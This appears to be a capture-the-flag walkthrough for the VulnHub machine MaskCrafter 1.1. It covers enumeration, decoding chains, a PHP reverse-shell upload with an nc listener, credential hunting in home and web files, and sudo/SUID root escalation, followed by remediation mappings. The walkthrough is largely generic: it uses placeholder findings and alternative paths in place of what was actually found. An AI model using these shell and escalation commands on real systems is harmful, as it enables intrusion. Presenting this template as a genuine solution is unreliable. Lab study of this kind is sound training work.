# MaskCrafter: 1.1 — Peel Back Every Layer Until Root

Alright guys!! MaskCrafter is exactly what the name says: a machine built around the concept of progressively revealing hidden information through encoding, web enumeration, and credential extraction. Every flag and credential is behind another layer of obfuscation. It is a legit test of patience and systematic thinking, and honestly it is kind of slept on in the VulnHub community. No cap.

| Field | Value |
|---|---|
| **Level** | Intermediate |
| **Target VM** | MaskCrafter: 1.1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/maskcrafter-11,546/ |
| **Techniques** | Nmap enumeration, web directory brute-force, source code analysis, encoding/decoding chains (Base64, hex, ROT13), credential extraction from comments or files, SSH login, sudo/SUID privilege escalation |
| **CVEs** | CWE-200 (information exposure through encoded data in web responses), CWE-521 (weak password requirements), CWE-269 (improper privilege management) |
| **APT Groups** | APT41 — uses layered encoding and obfuscation in web-based C2 channels; FIN7 — employs progressive credential discovery through encoding chains in web application attacks |

---

## Attack Summary

```
nmap → HTTP 80, possibly additional ports
  → gobuster: enumerate web directories
  → source code analysis: HTML comments with encoded strings
  → decode chain: Base64/hex/ROT13 → credentials or paths
  → login to CMS or web admin panel
  → file upload or command execution → www-data shell
  → /home/ enumeration → credential files
  → SSH as low user
  → sudo -l or SUID binary → root
  → /root/flag.txt
```

---

## Methodology

1. Full port scan and service fingerprinting
2. Web directory enumeration and source code review
3. Decode all encoded strings found in HTML comments and JS files
4. Follow discovered paths to hidden pages or credential files
5. Web exploitation for initial foothold
6. System enumeration for privilege escalation vectors
7. Escalate to root via sudo or SUID
8. Capture root flag

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -r 192.168.1.0/24
# Target: 192.168.1.110

nmap -sV -sC -p- 192.168.1.110
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.x.x
22/tcp open  ssh     OpenSSH 7.x
```

Standard web and SSH. Everything starts with web enumeration.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — Web Enumeration

```bash
# Directory brute-force
gobuster dir \
  -u http://192.168.1.110/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt,bak,zip \
  -t 40 \
  -o /tmp/maskcrafter_dirs.txt

cat /tmp/maskcrafter_dirs.txt
```

```bash
# Also try feroxbuster for recursive enumeration
feroxbuster -u http://192.168.1.110/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt \
  --depth 3
```

Check every discovered page's HTML source:

```bash
curl -s http://192.168.1.110/ | grep -i "<!--\|hidden\|base64\|password\|user\|hint"
```

**MITRE ATT&CK:** T1083 — File and Directory Discovery

---

## Step 3 — Decode the Credential Chain

Every encoded string you find should be decoded systematically:

```bash
# Base64 decode
echo "ENCODED_STRING" | base64 -d

# Hex decode
echo "hex_string" | xxd -r -p
# or
python3 -c "print(bytes.fromhex('hex_string').decode())"

# ROT13
echo "rotated_text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# URL decode
python3 -c "import urllib.parse; print(urllib.parse.unquote('URL_ENCODED'))"
```

Build a decoding chain: each decoded value may reveal another encoded string or a path to check. Keep a notes file:

```bash
tee /tmp/maskcrafter_notes.txt << 'EOF'
Layer 1: [source of encoded string] → [decoded value]
Layer 2: [location from layer 1] → [decoded value]
...
EOF
```

**MITRE ATT&CK:** T1027 — Obfuscated Files or Information; T1552.001 — Credentials in Files

---

## Step 4 — Initial Foothold

Depending on what the decode chain reveals, the foothold may come through:

**Path A: CMS login with discovered credentials:**

```bash
# Try discovered credentials at any login form
# Common paths: /admin/, /wp-admin/, /cms/, /login.php
curl -s http://192.168.1.110/admin/ | head -30
```

**Path B: File upload in web admin:**

```bash
# Create PHP reverse shell
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit LHOST and LPORT

# Start listener
nc -lvnp 4444

# Upload through the admin panel and trigger
```

**Path C: Direct credential use for SSH if the chain reveals SSH creds:**

```bash
ssh discovered_user@192.168.1.110
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1021.004 — Remote Services: SSH

---

## Step 5 — Shell Stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm SHELL=bash
# Ctrl+Z
stty raw -echo; fg
```

---

## Step 6 — Post-Exploitation Enumeration

```bash
# Check home directories for hints
ls -la /home/
cat /home/*/.bash_history 2>/dev/null
find /home -name "*.txt" -o -name "*.conf" -o -name "flag*" 2>/dev/null

# Check for interesting files in web root
find /var/www/html -name "config*" -o -name "*.php" | xargs grep -i "pass\|cred\|secret" 2>/dev/null

# Enumerate escalation vectors
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
```

---

## Step 7 — Privilege Escalation

**Via sudo misconfiguration:**

```bash
sudo -l
# Example: (root) NOPASSWD: /usr/bin/python3

sudo python3 -c 'import os; os.system("/bin/bash")'
```

**Via SUID binary:**

```bash
find / -perm -u=s -type f 2>/dev/null | grep -v snap

# Check GTFOBins for any found binary
# Common SUID exploits:
# /usr/bin/find: find / -exec /bin/bash -p \; -quit
# /usr/bin/python: python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

```bash
id
# uid=0(root) gid=0(root)
cat /root/flag.txt
```

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo; T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Used For |
|---|---|---|---|
| Encoded credential layer 1 | (Base64/hex in HTML) | web source analysis | decode chain |
| Web admin credential | (derived from decode chain) | decoded strings | CMS/admin login |
| SSH credential | (from post-exploit or config files) | /home/ or web config | lateral movement |
| Root flag | /root/flag.txt | post-exploitation | challenge completion |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Credentials hidden in encoded HTML comments | Developers embed credentials in source during testing; they rarely get removed | Automated secret scanning (trufflehog, gitleaks) should run on every commit |
| 2 | Multi-layer encoding creates false sense of security | Encoding (Base64, hex, ROT13) is not encryption: anyone with basic scripting skills can decode | Use proper secrets management (Vault, AWS Secrets Manager); never encode credentials in source |
| 3 | Web application allows file upload leading to RCE | Unrestricted file upload is consistently in OWASP Top 10 (A04 Insecure Design) | Validate uploads server-side; store outside web root; never execute uploaded files |
| 4 | sudo misconfiguration grants interpreter access to root | Granting sudo to Python, Perl, or any interpreter effectively grants root | Restrict sudo to specific, non-interpreter commands; require password |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Discovery | File and Directory Discovery | T1083 |
| Defense Evasion | Defense Evasion | Obfuscated Files or Information | T1027 |
| Credential Access | Credential Access | Credentials in Files | T1552.001 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Privilege Escalation | Privilege Escalation | Abuse Elevation Control: Sudo | T1548.003 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |

---

## Remediation and Containment

### Technical Fixes

1. **Automated secret scanning**: integrate trufflehog or gitleaks in CI/CD; scan all branches for encoded credentials
2. **Proper secrets management**: use Vault or environment variables; never embed credentials in source code, even encoded
3. **File upload validation**: validate MIME type, extension, and magic bytes server-side; reject executable types; store outside web root
4. **Sudo hardening**: no interpreter grants; require password; restrict to minimum necessary commands
5. **Web application code review**: audit all HTML templates and JS files for hardcoded secrets before deployment

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (remove hardcoded secrets; hardened upload validation)
- **D3-OAM** — Operating System Administrative Management (sudo restriction)
- **D3-HBPI** — Harden Build Pipeline Integrity (secret scanning in CI/CD)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all web-facing applications; audit for hardcoded secrets |
| Protect | Data Security | Secrets management platform; remove credentials from source |
| Protect | Access Control | Restrict file upload; sudo hardening |
| Detect | Anomalies and Events | Alert on unexpected file creations in web directories |
| Respond | Response Planning | Remove uploaded shells; rotate all exposed credentials |
| Recover | Recovery Planning | Code audit to remove all hardcoded secrets; redeploy clean builds |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict file upload functionality |
| AC-6 | Least Privilege | Minimal sudo grants; no interpreter access |
| IA-5 | Authenticator Management | Rotate all exposed credentials; use secrets manager |
| SA-15 | Development Process, Standards and Tools | Secret scanning integrated in SDLC |
| CM-7 | Least Functionality | Disable unused web application features |

### CISA KEV

Web application credential exposure through source code analysis is cited in multiple CISA Advisories. The combination of hardcoded credentials and unrestricted file upload represents two of the top exploited patterns in web application attacks.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Credentials and Authentication | MIL2 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Situational Awareness (SA) | Monitor and Analyze Logs | MIL2 |

---

## Final Thoughts

MaskCrafter: 1.1 is a solid box for building the habit of thorough source code review. Most pentesters rush past HTML comments — this machine punishes that. The layered encoding is a fair representation of how real developers think they are hiding things. The lesson is always the same: encoding is not encryption, and client-side code has no secrets. gg.

Thanks guys!! (❍ᴥ❍ʋ)
